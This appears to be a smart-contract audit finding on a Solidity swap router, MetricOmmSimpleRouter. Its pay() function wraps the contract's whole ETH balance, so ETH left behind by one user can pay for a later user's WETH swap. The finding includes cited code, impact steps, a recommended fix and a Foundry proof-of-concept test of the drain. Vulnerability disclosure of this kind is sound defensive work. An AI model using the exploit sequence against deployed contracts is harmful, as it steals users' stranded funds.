The vulnerability claim is valid. Here is the full analysis:

---

### Title
Stale Native ETH in Router Consumed by Subsequent WETH Swapper — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary

`PeripheryPayments.pay()` uses the router's **total** `address(this).balance` when settling a WETH swap, with no per-caller accounting. Native ETH left in the router from a prior user's `msg.value` overpayment (across transaction boundaries) is silently consumed to settle a subsequent user's WETH input, bypassing that user's ERC-20 allowance entirely and stealing the prior user's ETH.

### Finding Description

`pay()` branches on `token == WETH` and reads `address(this).balance`: [1](#0-0) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
```

`nativeBalance` is the **contract-wide** ETH balance, not the current caller's `msg.value`. ETH can accumulate in the router between transactions because every swap entry-point is `payable`: [2](#0-1) 

A user who calls `exactInputSingle{value: X}` with `amountIn < X` and omits `refundETH()` leaves `X - amountIn` ETH stranded in the router. The `receive()` guard only blocks bare ETH transfers; it does not prevent ETH from accumulating via `payable` function calls: [3](#0-2) 

The transient-storage payer slot correctly records the second caller as `payer`, but `pay()` never checks whether the ETH it is about to wrap actually came from that payer: [4](#0-3) 

### Impact Explanation

- **Victim** calls `exactInputSingle{value: 1 ether}` with `amountIn = 0.5 ether` (WETH), does not call `refundETH()`. Router retains 0.5 ETH.
- **Attacker** calls `exactInputSingle` (no `msg.value`) with `tokenIn = WETH`, `amountIn = 0.5 ether`.
- In the callback, `nativeBalance = 0.5 ether >= value = 0.5 ether` → router wraps victim's ETH and transfers WETH to the pool.
- Attacker's WETH allowance consumed: **zero**. Pool receives full `amountIn`. Victim's 0.5 ETH is gone.

This is a direct, cross-transaction theft of user principal. The pool's accounting is internally consistent (it receives the correct token amount), but the wrong party pays.

### Likelihood Explanation

Medium. The precondition is that a victim leaves ETH in the router by overpaying and omitting `refundETH()`. The test suite itself demonstrates this is an expected usage pattern: [5](#0-4) 

Users who call `exactInputSingle` directly (not via multicall) or who build multicalls without `refundETH()` are vulnerable. An attacker can monitor the router's ETH balance on-chain and exploit it immediately.

### Recommendation

Track the ETH contributed by the **current call** rather than the contract's total balance. The standard fix is to pass `msg.value` (or a per-call ETH budget) into `pay()` and consume only from that amount, refunding any remainder. Alternatively, enforce that `address(this).balance` is zero at the start of every swap entry-point (i.e., require callers to use multicall with `refundETH()`).

### Proof of Concept

```solidity
// 1. Victim overpays and forgets refundETH
vm.deal(victim, 1 ether);
vm.prank(victim);
router.exactInputSingle{value: 1 ether}(ExactInputSingleParams({
    pool: pool, tokenIn: weth, tokenOut: token1,
    zeroForOne: true, amountIn: 0.5 ether,
    amountOutMinimum: 0, recipient: victim,
    deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
}));
// Router now holds 0.5 ETH

// 2. Attacker swaps WETH with zero msg.value, zero WETH allowance
uint256 attackerAllowanceBefore = weth.allowance(attacker, address(router));
vm.prank(attacker);
router.exactInputSingle(ExactInputSingleParams({
    pool: pool, tokenIn: weth, tokenOut: token1,
    zeroForOne: true, amountIn: 0.5 ether,
    amountOutMinimum: 0, recipient: attacker,
    deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
}));

// Assertions
assertEq(weth.allowance(attacker, address(router)), attackerAllowanceBefore); // allowance unchanged
assertEq(address(router).balance, 0);   // victim's ETH consumed
assertEq(victim.balance, 0);            // victim lost 0.5 ETH
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-67)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
